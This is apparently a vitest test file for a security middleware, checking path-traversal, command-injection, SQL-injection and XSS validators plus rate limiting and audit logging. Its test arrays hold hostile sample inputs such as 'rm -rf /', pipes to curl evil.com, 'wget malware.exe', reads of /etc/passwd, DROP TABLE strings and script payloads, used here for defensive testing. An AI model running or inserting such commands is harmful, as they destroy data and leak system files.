import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { InputValidator } from '../middleware/validation.mjs';
import { RateLimiter, MemoryRateLimitStore } from '../middleware/rate-limit.mjs';
import { auditLogger } from '../audit/logger.mjs';
import { SecurityEventType, SecuritySeverity } from '../types/security.mjs';

describe('Security Framework Integration Tests', () => {
  describe('Input Validation', () => {
    describe('Path Traversal Prevention', () => {
      it('should block path traversal attempts', () => {
        const maliciousPaths = [
          '../../../etc/passwd',
          '..\\..\\windows\\system32',
          '/etc/passwd',
          'file://etc/passwd',
          '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
          '....//....//....//etc/passwd',
          '..%2f..%2f..%2fetc%2fpasswd',
          '..%252f..%252f..%252fetc%252fpasswd'
        ];

        maliciousPaths.forEach(path => {
          const result = InputValidator.validateFilePath(path);
          expect(result.isValid).toBe(false);
          expect(result.errors.length).toBeGreaterThan(0);
          expect(result.errors.some(e => 
            e.code === 'DANGEROUS_PATH_PATTERN' || 
            e.code === 'PATH_TRAVERSAL_ATTEMPT'
          )).toBe(true);
        });
      });

      it('should allow valid file paths', () => {
        const validPaths = [
          'file.txt',
          'folder/file.txt',
          'src/components/Button.tsx',
          'docs/readme.md',
          'package.json'
        ];

        validPaths.forEach(path => {
          const result = InputValidator.validateFilePath(path);
          expect(result.isValid).toBe(true);
          expect(result.errors.length).toBe(0);
          expect(result.sanitizedData).toBeDefined();
        });
      });
    });

    describe('Command Injection Prevention', () => {
      it('should block command injection attempts', () => {
        const maliciousCommands = [
          'npm install; rm -rf /',
          'node app.js && cat /etc/passwd',
          'prettier file.js | curl evil.com',
          'tsc --build > /dev/null; wget malware.exe',
          'eslint . && $(curl evil.com)',
          'npm run build; echo "hacked" > /tmp/pwned',
          'node -e "require(\'child_process\').exec(\'rm -rf /\')"'
        ];

        maliciousCommands.forEach(command => {
          const result = InputValidator.validateCommand(command);
          expect(result.isValid).toBe(false);
          expect(result.errors.length).toBeGreaterThan(0);
          expect(result.errors.some(e => 
            e.code === 'COMMAND_INJECTION_ATTEMPT' || 
            e.code === 'COMMAND_NOT_ALLOWED'
          )).toBe(true);
        });
      });

      it('should allow safe commands', () => {
        const safeCommands = [
          'npm install',
          'node app.js',
          'prettier --write file.js',
          'tsc --build',
          'eslint src/'
        ];

        safeCommands.forEach(command => {
          const result = InputValidator.validateCommand(command);
          expect(result.isValid).toBe(true);
          expect(result.errors.length).toBe(0);
        });
      });
    });

    describe('SQL Injection Prevention', () => {
      it('should detect SQL injection attempts', () => {
        const sqlInjectionAttempts = [
          "'; DROP TABLE users; --",
          "' OR '1'='1",
          "' UNION SELECT * FROM passwords --",
          "admin'--",
          "' OR 1=1 --",
          "'; INSERT INTO users VALUES ('hacker', 'password'); --",
          "' OR EXISTS(SELECT * FROM users WHERE username='admin') --"
        ];

        sqlInjectionAttempts.forEach(query => {
          const result = InputValidator.validateSQLQuery(query);
          expect(result.isValid).toBe(false);
          expect(result.errors.length).toBeGreaterThan(0);
          expect(result.errors.some(e => e.code === 'SQL_INJECTION_ATTEMPT')).toBe(true);
        });
      });

      it('should allow safe SQL queries', () => {
        const safeQueries = [
          'SELECT * FROM users WHERE id = ?',
          'INSERT INTO logs (message, timestamp) VALUES (?, ?)',
          'UPDATE users SET last_login = ? WHERE id = ?',
          'DELETE FROM sessions WHERE expires_at < ?'
        ];

        safeQueries.forEach(query => {
          const result = InputValidator.validateSQLQuery(query);
          expect(result.isValid).toBe(true);
          expect(result.errors.length).toBe(0);
        });
      });
    });

    describe('XSS Prevention', () => {
      it('should detect and sanitize XSS attempts', () => {
        const xssAttempts = [
          '<script>alert("XSS")</script>',
          '<img src="x" onerror="alert(1)">',
          '<iframe src="javascript:alert(1)"></iframe>',
          '<object data="javascript:alert(1)"></object>',
          '<embed src="javascript:alert(1)">',
          '<link rel="stylesheet" href="javascript:alert(1)">',
          '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
          'javascript:alert(1)',
          'vbscript:alert(1)',
          '<div onmouseover="alert(1)">Hover me</div>'
        ];

        xssAttempts.forEach(html => {
          const result = InputValidator.validateHTML(html);
          expect(result.sanitizedData).toBeDefined();
          expect(result.sanitizedData).not.toContain('<script');
          expect(result.sanitizedData).not.toContain('javascript:');
          expect(result.sanitizedData).not.toContain('onerror=');
        });
      });
    });
  });

  describe('Rate Limiting', () => {
    let rateLimiter: RateLimiter;
    let store: MemoryRateLimitStore;

    beforeEach(() => {
      store = new MemoryRateLimitStore();
      rateLimiter = new RateLimiter({
        windowMs: 60000,
        maxRequests: 5,
        skipSuccessfulRequests: false,
        skipFailedRequests: false,
        standardHeaders: true,
        legacyHeaders: false
      }, store);
    });

    afterEach(() => {
      rateLimiter.destroy();
    });

    it('should allow requests within limit', async () => {
      const key = 'test-user-1';
      
      for (let i = 0; i < 5; i++) {
        const info = await rateLimiter.checkLimit(key);
        expect(info.current).toBe(i + 1);
        expect(info.remaining).toBe(4 - i);
        expect(info.limit).toBe(5);
      }
    });

    it('should block requests exceeding limit', async () => {
      const key = 'test-user-2';
      
      // Use up the limit
      for (let i = 0; i < 5; i++) {
        await rateLimiter.checkLimit(key);
      }

      // Next request should exceed limit
      const info = await rateLimiter.checkLimit(key);
      expect(info.current).toBe(6);
      expect(info.remaining).toBe(0);
      expect(info.current > info.limit).toBe(true);
    });

    it('should reset limit after window expires', async () => {
      const key = 'test-user-3';
      
      // Use up the limit
      for (let i = 0; i < 5; i++) {
        await rateLimiter.checkLimit(key);
      }

      // Reset the limit manually (simulating window expiry)
      await rateLimiter.resetLimit(key);

      // Should be able to make requests again
      const info = await rateLimiter.checkLimit(key);
      expect(info.current).toBe(1);
      expect(info.remaining).toBe(4);
    });

    it('should handle different keys independently', async () => {
      const key1 = 'user-1';
      const key2 = 'user-2';

      // Use up limit for user 1
      for (let i = 0; i < 5; i++) {
        await rateLimiter.checkLimit(key1);
      }

      // User 2 should still have full limit
      const info = await rateLimiter.checkLimit(key2);
      expect(info.current).toBe(1);
      expect(info.remaining).toBe(4);
    });
  });

  describe('Audit Logging', () => {
    beforeEach(() => {
      // Clear any existing events
      auditLogger.updateConfig({ enabled: true });
    });

    it('should log security events', async () => {
      await auditLogger.logSecurityEvent({
        type: SecurityEventType.AUTHENTICATION,
        severity: SecuritySeverity.LOW,
        userId: 'test-user',
        ipAddress: '127.0.0.1',
        userAgent: 'test-agent',
        resource: '/api/test',
        action: 'login',
        outcome: 'success',
        details: { method: 'password' }
      });

      const events = await auditLogger.getSecurityEvents({
        type: SecurityEventType.AUTHENTICATION,
        limit: 1
      });

      expect(events.length).toBe(1);
      expect(events[0].type).toBe(SecurityEventType.AUTHENTICATION);
      expect(events[0].userId).toBe('test-user');
      expect(events[0].outcome).toBe('success');
    });

    it('should filter events by criteria', async () => {
      // Log multiple events
      await auditLogger.logSecurityEvent({
        type: SecurityEventType.AUTHENTICATION,
        severity: SecuritySeverity.LOW,
        userId: 'user-1',
        ipAddress: '127.0.0.1',
        userAgent: 'test-agent',
        resource: '/api/login',
        action: 'login',
        outcome: 'success',
        details: {}
      });

      await auditLogger.logSecurityEvent({
        type: SecurityEventType.AUTHORIZATION,
        severity: SecuritySeverity.MEDIUM,
        userId: 'user-2',
        ipAddress: '127.0.0.1',
        userAgent: 'test-agent',
        resource: '/api/admin',
        action: 'access',
        outcome: 'failure',
        details: {}
      });

      // Filter by type
      const authEvents = await auditLogger.getSecurityEvents({
        type: SecurityEventType.AUTHENTICATION
      });
      expect(authEvents.length).toBe(1);
      expect(authEvents[0].type).toBe(SecurityEventType.AUTHENTICATION);

      // Filter by user
      const user1Events = await auditLogger.getSecurityEvents({
        userId: 'user-1'
      });
      expect(user1Events.length).toBe(1);
      expect(user1Events[0].userId).toBe('user-1');

      // Filter by severity
      const mediumEvents = await auditLogger.getSecurityEvents({
        severity: SecuritySeverity.MEDIUM
      });
      expect(mediumEvents.length).toBe(1);
      expect(mediumEvents[0].severity).toBe(SecuritySeverity.MEDIUM);
    });

    it('should generate security metrics', async () => {
      const startTime = new Date();
      
      // Log various events
      await auditLogger.logSecurityEvent({
        type: SecurityEventType.AUTHENTICATION,
        severity: SecuritySeverity.LOW,
        ipAddress: '127.0.0.1',
        userAgent: 'test-agent',
        resource: '/api/login',
        action: 'login',
        outcome: 'success',
        details: {}
      });

      await auditLogger.logSecurityEvent({
        type: SecurityEventType.AUTHENTICATION,
        severity: SecuritySeverity.MEDIUM,
        ipAddress: '127.0.0.1',
        userAgent: 'test-agent',
        resource: '/api/login',
        action: 'login',
        outcome: 'failure',
        details: {}
      });

      await auditLogger.logSecurityEvent({
        type: SecurityEventType.RATE_LIMIT_EXCEEDED,
        severity: SecuritySeverity.HIGH,
        ipAddress: '127.0.0.1',
        userAgent: 'test-agent',
        resource: '/api/data',
        action: 'request',
        outcome: 'blocked',
        details: {}
      });

      const endTime = new Date();
      const metrics = await auditLogger.getSecurityMetrics({
        start: startTime,
        end: endTime
      });

      expect(metrics.totalEvents).toBe(3);
      expect(metrics.eventsByType[SecurityEventType.AUTHENTICATION]).toBe(2);
      expect(metrics.eventsByType[SecurityEventType.RATE_LIMIT_EXCEEDED]).toBe(1);
      expect(metrics.successfulEvents).toBe(1);
      expect(metrics.failedEvents).toBe(1);
      expect(metrics.blockedEvents).toBe(1);
    });
  });

  describe('Security Integration Scenarios', () => {
    it('should handle multiple security violations in sequence', async () => {
      // Simulate a series of attacks
      const attacks = [
        {
          type: 'path_traversal',
          input: '../../../etc/passwd',
          validator: InputValidator.validateFilePath
        },
        {
          type: 'command_injection',
          input: 'npm install; rm -rf /',
          validator: InputValidator.validateCommand
        },
        {
          type: 'sql_injection',
          input: "'; DROP TABLE users; --",
          validator: InputValidator.validateSQLQuery
        }
      ];

      const results = attacks.map(attack => ({
        type: attack.type,
        result: attack.validator(attack.input)
      }));

      // All attacks should be blocked
      results.forEach(({ type, result }) => {
        expect(result.isValid).toBe(false);
        expect(result.errors.length).toBeGreaterThan(0);
      });
    });

    it('should maintain security under load', async () => {
      const rateLimiter = new RateLimiter({
        windowMs: 1000,
        maxRequests: 10,
        skipSuccessfulRequests: false,
        skipFailedRequests: false,
        standardHeaders: true,
        legacyHeaders: false
      });

      // Simulate concurrent requests
      const promises = Array.from({ length: 20 }, (_, i) => 
        rateLimiter.checkLimit(`load-test-${i % 5}`) // 5 different users
      );

      const results = await Promise.all(promises);
      
      // Some requests should be within limit, others should exceed
      const withinLimit = results.filter(r => r.current <= r.limit);
      const exceedingLimit = results.filter(r => r.current > r.limit);

      expect(withinLimit.length).toBeGreaterThan(0);
      expect(exceedingLimit.length).toBeGreaterThan(0);
      expect(withinLimit.length + exceedingLimit.length).toBe(20);

      rateLimiter.destroy();
    });

    it('should validate complex nested input structures', () => {
      const complexInput = {
        user: {
          name: 'John Doe',
          email: 'john@example.com',
          profile: {
            bio: '<script>alert("XSS")</script>Normal bio text',
            website: 'https://example.com'
          }
        },
        files: [
          'document.pdf',
          '../../../etc/passwd',
          'image.jpg'
        ],
        commands: [
          'npm install',
          'rm -rf /',
          'prettier --write *.js'
        ]
      };

      // Validate files
      const fileResults = complexInput.files.map(file => 
        InputValidator.validateFilePath(file)
      );
      
      expect(fileResults[0].isValid).toBe(true);  // document.pdf
      expect(fileResults[1].isValid).toBe(false); // ../../../etc/passwd
      expect(fileResults[2].isValid).toBe(true);  // image.jpg

      // Validate commands
      const commandResults = complexInput.commands.map(cmd => 
        InputValidator.validateCommand(cmd)
      );
      
      expect(commandResults[0].isValid).toBe(true);  // npm install
      expect(commandResults[1].isValid).toBe(false); // rm -rf /
      expect(commandResults[2].isValid).toBe(true);  // prettier --write *.js

      // Validate HTML content
      const bioResult = InputValidator.validateHTML(complexInput.user.profile.bio);
      expect(bioResult.sanitizedData).not.toContain('<script>');
      expect(bioResult.sanitizedData).toContain('Normal bio text');
    });
  });

  describe('Performance and Scalability', () => {
    it('should validate inputs efficiently', () => {
      const startTime = Date.now();
      const iterations = 1000;

      for (let i = 0; i < iterations; i++) {
        InputValidator.validateFilePath(`file-${i}.txt`);
        InputValidator.validateCommand(`npm run test-${i}`);
        InputValidator.validateHTML(`<p>Content ${i}</p>`);
      }

      const endTime = Date.now();
      const duration = endTime - startTime;
      const avgTime = duration / iterations;

      // Should process validations quickly (less than 1ms per validation on average)
      expect(avgTime).toBeLessThan(1);
    });

    it('should handle rate limiting efficiently', async () => {
      const rateLimiter = new RateLimiter({
        windowMs: 60000,
        maxRequests: 1000,
        skipSuccessfulRequests: false,
        skipFailedRequests: false,
        standardHeaders: true,
        legacyHeaders: false
      });

      const startTime = Date.now();
      const iterations = 100;

      const promises = Array.from({ length: iterations }, (_, i) => 
        rateLimiter.checkLimit(`perf-test-${i}`)
      );

      await Promise.all(promises);

      const endTime = Date.now();
      const duration = endTime - startTime;
      const avgTime = duration / iterations;

      // Should process rate limit checks quickly (less than 5ms per check on average)
      expect(avgTime).toBeLessThan(5);

      rateLimiter.destroy();
    });
  });
});